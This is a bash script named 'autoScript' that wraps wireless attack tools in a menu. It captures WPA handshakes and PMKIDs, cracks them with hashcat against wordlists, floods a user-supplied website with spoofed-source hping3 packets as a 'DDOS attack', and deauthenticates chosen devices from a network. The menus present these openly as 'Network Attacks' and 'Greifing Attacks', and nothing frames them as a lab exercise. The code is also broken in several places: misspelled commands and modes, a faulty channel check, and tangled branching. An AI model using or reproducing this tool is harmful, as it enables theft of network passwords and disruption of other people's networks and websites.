#!/usr/bin/env bash

moniter-mode() {
clear
echo "Change to Moniter Mode"
echo ""
echo "-Type "exit" to return to main menue"
echo ""
echo "======================================================================="
iwconfig
echo "======================================================================="
echo ""
read -p "Enter the name of your network adapter: " NETWORK
if [ -z "$NETWORK" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
moniter-mode
elif [ "$NETWORK" == "exit" ]
then
exec bash "$0" "$@"
fi
ifconfig "$NETWORK" down > /dev/null 2>&1 && VALUE1=2
if [ "$VALUE1" == 2 ]
then
VALUE1=1
else
sleep 1
echo ""
echo "Network adapter not found"
sleep 2
moniter-mode
fi
iwconfig "$NETWORK" mode moniter> /dev/null 2>&1 && VALUE2=2
if [ "$VALUE2" == 2 ]
then
VALUE2=1
else
sleep 1
echo ""
echo "Network adapter invalid"
sleep 2
moniter-mode
fi
ifconfig "$NETWORK" down
iwconfig "$NETWORK" mode monitor
ifconfig "$NETWORK" up
echo ""
echo "Changed to Monitor Mode"
echo ""
read -n 1 -s -r -p "Press any key to continue..."
clear
exec bash "$0" "$@"
}
managed-mode() {
clear
echo "Change to Managed Mode"
echo ""
echo "-Type "exit" to return to main menue"
echo ""
echo "========================================================================="
iwconfig
echo "========================================================================="
echo ""
read -p "Enter the name of your network adapter: " NETWORK
if [ -z "$NETWORK" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
managed-mode
elif [ "$NETWORK" == "exit" ]
then
exec bash "$0" "$@"
fi
ifconfig "$NETWORK" down > /dev/null 2>&1 && VALUE1=2
if [ "$VALUE1" == 2 ]
then
VALUE1=1
else
sleep 1
echo ""
echo "Network adapter not found"
sleep 2
managed-mode
fi
iwconfig "$NETWORK" mode managed> /dev/null 2>&1 && VALUE2=2
if [ "$VALUE2" == 2 ]
then
VALUE2=1
else
sleep 1
echo ""
echo "Network adapter invalid"
sleep 2
moniter-mode
fi
ifconfig "$NETWORK" down
iwconfig "$NETWORK" mode managed
ifconfig "$NETWORK" up
echo ""
echo "Changed to Managed Mode"
echo ""
read -n 1 -s -r -p "Press any key to continue..."
clear
exec bash "$0" "$@"

}
adapter-mode() {
echo ""
echo ""
echo "1) Moniter Mode"
echo "2) Managed Mode"
echo "3) Back"
echo ""
read -n 1 -p "Select Mode: " CHOICE2
if [ -z "$CHOICE2" ]
then
echo ""
echo "Not and Option"
sleep 2
exec bash "$0" "$@"
elif [ $CHOICE2 == 1 ]
then
moniter-mode
elif [ $CHOICE2 == 2 ]
then
managed-mode
elif [ $CHOICE2 == 3 ]
then
exec bash "$0" "$@"
else
echo ""
echo ""
echo "Not an Option"
sleep 2
exec bash "$0" "$@"
fi
}
Network-Scan() {
clear
echo "Scan for nearby networks"
echo ""
echo "-During scan press CTRL+C to stop"
echo "-Type "exit" to return to main menue"
echo ""
echo "====================================================================="
iwconfig
echo "====================================================================="
echo ""
read -p "Enter the name of your network adapter: " NETWORK
if [ -z "$NETWORK" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
Network-Scan
elif [ "$NETWORK" == "exit" ]
then
exec bash "$0" "$@"
fi
ifconfig "$NETWORK" down > /dev/null 2>&1 && VALUE1=2
if [ "$VALUE1" == 2 ]
then
VALUE1=1
else
sleep 1
echo ""
echo "Network adapter not found"
sleep 2
Network-Scan
fi
iwconfig "$NETWORK" mode moniter> /dev/null 2>&1 && VALUE2=2
if [ "$VALUE2" == 2 ]
then
VALUE2=1
else
sleep 1
echo ""
echo "Network adapter invalid"
sleep 2
Network-Scan
fi
ifconfig "$NETWORK" down
iwconfig "$NETWORK" mode moniter
ifconfig "$NETWORK" up
echo ""
read -n 1 -r -s -p "Press any key to begin scan..."
airodump-ng "$NETWORK"
echo ""
read -n 1 -r -s -p "Press any key to continue..."
clear
exec bash "$0" "$@"
}
Read-Channel-1() {
echo ""
read -p "Enter channel of network: " CHANNEL
if [ -z "$CHANNEL" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
Read-Channel-1
fi
if ! [[ "$CHANNEL" =~ ^[0-13]+$ ]]
then
echo ""
echo "Not a channel"
sleep 2
Read-Channel-1
fi
}
Read-BSSID-1() {
echo ""
read -p "Enter BSSID of network: " BSSID
BSSID_LENGTH_1=${#BSSID}
if [ -z "$BSSID" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
Read-BSSID-1
elif [ "$BSSID_LENGTH_1" -ne 17 ]
then
echo ""
echo "Not a valid BSSID"
sleep 2
Read-BSSID-1
fi
}
Read-Filename-1() {
echo ""
read -p "Enter a file name for capture: " FILE
if [ -z "$FILE" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
Read-Filename-1
elif [[ $FILE == *"."* ]]
then
echo ""
echo "File name cannot contain a period"
sleep 2
Read-Filename-1
fi
}
Packet-Collect() {
clear
echo "Capture packets from selected network"
echo ""
echo "-During scan press CTRL+C to stop"
echo "-Type "exit" to return to main menue"
echo ""
echo "===================================================================="
iwconfig
echo "===================================================================="
echo ""
read -p "Enter name of your network adapter: " NETWORK
if [ -z "$NETWORK" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
Packet-Collect
elif [ "$NETWORK" == "exit" ]
then
exec bash "$0" "$@"
fi
ifconfig "$NETWORK" > /dev/null 2>&1 && VALUE1=2
if [ "$VALUE1" == 2 ]
then
VALUE1=1
else
sleep 1
echo ""
echo "Network adapter not found"
sleep 2
Packet-Collect
fi
iwconfig "$NETWORK" mode moniter > /dev/null 2>&1 && VALUE2=2
if [ "$VALUE2" == 2 ]
then
VALUE2=1
else
sleep 1
echo ""
echo "Network adapter invalid"
sleep 2
Packet-Collect
fi
ifconfig "$NETWORK" down
iwconfig "$NETWORK" mode monitor
ifconfig "$NETWORK" up
echo ""
read -n 1 -r -s -p "Press any key to begin scan..."
airodump-ng "$NETWORK"
echo "================================================================================"
echo ""
Read-Channel-1
Read-BSSID-1
Read-Filename-1
echo ""
read -n 1 -s -r -p "Press any key to start capture..."
airodump-ng "$NETWORK" --channel "$CHANNEL" --bssid "$BSSID" --write "$FILE"
echo ""
echo "File saved"
rm "$FILE"-01.csv
rm "$FILE"-01.kismet.csv
rm "$FILE"-01.kismet.netxml
rm "$FILE"-01.log.csv
mv "$FILE"-01.cap Capture-Files
echo "File cleaned"
echo "File moved"
read -n 1 -r -s -p "Press any key to continue..."
exec "$0" "$@"
}


































Network-Attack() {
echo ""
echo ""
echo "1) Scan for nearby network details"
echo "2) Capture packets from selected network"
echo "3) Capture PMKID from selected network"
echo "4) Back"
echo ""
read -n 1 -p "Select Attack: " ATTACK

if [ -z "$ATTACK" ]
then
echo ""
echo "Not and Option"
sleep 2
exec bash "$0" "$@"

elif [ $ATTACK == 1 ]
then
Network-Scan

elif [ $ATTACK == 2 ]
then
Packet-Collect

elif [ $ATTACK == 3 ]
then
clear
echo "Capture PMKID from selected network"
echo ""
echo "-During scan press CTRL+C to stop"
echo ""
echo "===================================================================="
iwconfig
echo "===================================================================="
echo ""
read -p "Enter name of your network adapter: " NETWORK
if [ -z "$NETWORK" ]
then
echo ""
echo "Invalid network adapter name"
sleep 2
exec bash "$0" "$@"
else
echo ""
echo "Processing..."
ifconfig "$NETWORK" > /dev/null 2>&1 && VALUE1=2
if [ "$VALUE1" == 2 ]
then
VALUE1=1
else
sleep 1
echo ""
echo "Network adapter not found"
sleep 2
exec bash "$0" "$@"
fi
ifconfig "$NETWORK" > /dev/null 2>&1
iwconfig "$NETWORK" mode managed > /dev/null 2>&1
ifconfig "$NETWORK" up > /dev/null 2>&1
airmon-ng check kill > /dev/null 2>&1
airmon-ng start "$NETWORK" > /dev/null 2>&1
echo ""
echo "Network adapter configured"
echo ""
read -n 1 -r -s -p "Press any key to begin scan..."
airodump-ng "$NETWORK"mon
echo ""
read -p "Enter channel of network: " CHANNEL
if [ -z "$CHANNEL" ]
then
echo ""
airmon-ng stop "$NETWORK"mon > /dev/null 2>&1
echo "Invalid Channel"
sleep 2
exec bash "$0" "$@"
else
read -p "Enter a file name for capture: " FILE
if [ -z "$FILE" ]
then
echo ""
airmon-ng stop "$NETWORK"mon > /dev/null 2>&1
echo "Invalid File Name"
sleep 2
exec bash "$0" "$@"
else
echo ""
read -n 1 -s -r -p "Press any key to start capture..."
clear
hcxdumptool -i "$NETWORK"mon -o "$FILE".pcapng --enable_status=1 -c "$CHANNEL"
echo ""
read -n 1 -r -s -p "Press any key to convert file..."
clear
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z "$FILE".16800 "$FILE".pcapng
echo "File converted"
mv "$FILE".pcapng Capture-Files
mv "$FILE".16800 Capture-Files
rm -R identitylist
rm -R essidlist
echo "File moved"
echo "File cleaned"
airmon-ng stop "$NETWORK"mon > /dev/null 2>&1
echo "Network adapter configured"
echo ""
read -n 1 -r -s -p "Press any key to continue..."
exec bash "$0" "$@"
fi
fi
fi

elif [ $ATTACK == 4 ]
then
exec bash "$0" "$@"
else
echo ""
echo ""
echo "Not an Option"
sleep 2
exec bash "$0" "$@"
fi
}











































clear
echo "              _       ____            _       _   "
echo "   __ _ _   _| |_ ___/ ___|  ___ _ __(_)_ __ | |_ "
echo "  / _. | | | | __/ _ \___ \ / __| '__| | '_ \| __|"
echo " | (_| | |_| | || (_) |__) | (__| |  | | |_) | |_ "
echo "  \__,_|\__,_|\__\___/____/ \___|_|  |_| .__/ \__|"
echo "                                       |_|        "
echo "                                                  "
echo ""
echo "Made by Treebug842"
echo ""
echo "1) Network Adapter Mode"
echo "2) Network Attacks"
echo "3) Greifing Attacks"
echo "4) Password Cracking"
echo "5) Exit"
echo ""
read -n 1 -p "Select Option: " OPTION

if [ -z "$OPTION" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
exec bash "$0" "$@"

elif [ $OPTION == 1 ]
then
adapter-mode

# End Menue
# ==================================================
# Start Menue







































elif [ $OPTION == 2 ]
then
Network-Attack


# End Menue
# ==================================================
# Start Menue

elif [ $OPTION == 3 ]
then
echo ""
echo ""
echo "1) Launch a DDOS attack on a website"
echo "2) Launch a DDOS attack on a network"
echo "3) Launch a Death attack on a device"
echo "4) Back"
echo ""
read -n 1 -p "Select attack: " ATTACK2
echo ""

if [ -z "$ATTACK2" ]
then
echo "Not an Option"
sleep 2
exec bash "$0" "$@"

elif [ $ATTACK2 == 1 ]
then
clear
echo "Launcha DDOS attack on a website"
echo ""
echo "During attack press CTRL+C to stop"
echo ""
read -p "Website URL: " WEBSITE
echo ""
gnome-terminal -e tshark > /dev/null 2>&1
sudo hping3 --flood --rand-source "$WEBSITE"
echo ""
read -n 1 -r -s -p "Press any key to continue..."
exec bash "$0" "$@"

elif [ $ATTACK2 == 2 ]
then
echo ""
echo "Coming soon..."
sleep 2
exec bash "$0" "$@"

elif [ $ATTACK2 == 3 ]
then
clear
echo "Deauth a specific device on a network"
echo ""
echo "-Type "exit" to return to main menue"
echo ""
echo "======================================================================="
iwconfig
echo "======================================================================="
echo ""
read -p "Enter the name of your network adapter: " NETWORK
if [ -z "$NETWORK" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
exec bash "$0" "$@"
elif [ "$NETWORK" == "exit" ]
then
exec bash "$0" "$@"
fi
ifconfig "$NETWORK" down > /dev/null 2>&1 && VALUE1=2
if [ "$VALUE1" == 2 ]
then
VALUE1=1
else
sleep 1
echo ""
echo "Network adapter not found"
sleep 2
exec bash "$0" "$@"
fi
iwconfig "$NETWORK" mode moniter> /dev/null 2>&1 && VALUE2=2
if [ "$VALUE2" == 2 ]
then
VALUE2=1
else
sleep 1
echo ""
echo "Network adapter invalid"
sleep 2
exec bash "$0" "$@"
fi
echo ""
read -n 1 -s -r -p "Press any key to begin scan..."
airodump-ng "$NETWORK"
echo ""
read -p "Enter BSSID of the Nework you are connected to: " BSSID_Network
BSSID_LENGTH_1=${#BSSID_Network}
if [ -z "$BSSID_Network" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
exec bash "$0" "$@"
elif [ "$BSSID_LENGTH_1" -ne 17 ]
then
echo ""
echo "Not a valid BSSID"
sleep 2
exec bash "$0" "$@"
fi
reap -n 1 -r -s -p "Press any key to begin n-Map..."
clear
cd ~/Programs/autoScript
echo "Mapping..."
nmap -p 80,8080,8081,81 192.168.0.1/24 > awk-File
echo ""
echo "============================================================="
echo ""
grep "MAC" awk-File
echo ""
echo "============================================================="
echo ""
read -p "Enter MAC adress of device: " BSSID_Device
BSSID_LENGTH_1=${#BSSID_Device}
if [ -z "$BSSID_Device" ]
then
echo ""
echo "Cannot leave blank"
sleep 2
exec bash "$0" "$@"
elif [ "$BSSID_LENGTH_1" -ne 17 ]
then
echo ""
echo "Not a valid MAC adress"
sleep 2
exec bash "$0" "$@"
fi
echo ""
aireplay-ng -0 1 -a "$BSSID_Network" -c "$BSSID_Device" "$NETWORK"
echo ""
read -p -n 1 -r -s "Press any key to continue..."
exec bash "$0" "$@"

elif [ $ATTACK2 == 4 ]
then
exec bash "$0" "$@"

else
echo ""
echo "Not an Option"
sleep 2
exec bash "$0" "$@"
fi
fi
# End Menue
# ==================================================
# Start Menue

if [ $OPTION == 4 ]
then
echo ""
echo ""
echo "1) Crack password with default list"
echo "2) Crack password with custum list"
echo "3) Crack password with brute force"
echo "4) Back"
echo ""
read -n 1 -p "Select Method: " METHOD
echo ""
if [ -z $METHOD ]
then
echo "Not an Option"
sleep 2
exec bash "$0" "$@"
elif [ $METHOD == 1 ]
then
clear
echo "Crack password using default password lists"
echo ""
echo "===================================================================="
cd ~/Programs/autoScript/Password-Lists/
ls
echo "===================================================================="
echo ""
read -p "Enter password list: " LIST
echo ""
echo "===================================================================="
cd ~/Programs/autoScript/Capture-Files/
ls *.16800
echo "===================================================================="
echo ""
read -p "Enter hash: " HASH
echo ""
read -n 1 -s -r -p "Press any key to begin crack..."
clear
cd ~/Programs/autoScript/Password-Lists/
hashcat -m 16800 ~/Programs/autoScript/Capture-Files/"$HASH" -a 0 --kernel-accel=1 -w 4 --force $LIST
echo ""
read -n 1 -r -s -p "Press any key to continue..."
cd ~/Programs/autoScript
exec bash "$0" "$@"
elif [ $METHOD == 2 ]
then
echo ""
echo "Coming soon..."
sleep 2
exec bash "$0" "$@"
elif [ $METHOD == 3 ]
then
echo ""
echo "Coming soon... "
sleep 2
exec bash "$0" "$@"
elif [ $METHOD == 4 ]
then
exec bash "$0" "$@"
else
echo ""
echo "Not an Option"
sleep 2
exec bash "$0" "$@"
fi
# End Menue
# ==================================================

elif [ $OPTION == 5 ]
then
clear
exit
else
echo ""
echo ""
echo "Not an Option"
sleep 2
exec bash "$0" "$@"
fi
